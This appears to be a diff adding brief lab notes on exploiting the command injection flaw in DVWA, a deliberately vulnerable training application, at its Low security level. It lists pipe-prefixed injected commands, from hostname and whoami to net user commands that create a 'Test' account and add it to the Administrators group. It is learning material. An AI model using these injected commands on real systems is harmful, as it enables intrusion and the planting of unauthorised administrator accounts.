@@ -1,0 +1,17 @@
+Login to DVWA
+Set the Security Level "Low"
+Click on the Command Injection Tab 
+Check the parameter is vulnerable or not and it is vulnerable 
+Now enter the system cmd's
+| hostname
+| whoami
+| dir C:\path.txt
+| type path.txt
+
+| net user
+| net user Test /Add
+| net user
+| net user Test
+| net localgroup Administrators Test /Add
+
+Succefully created the "Test" user account.
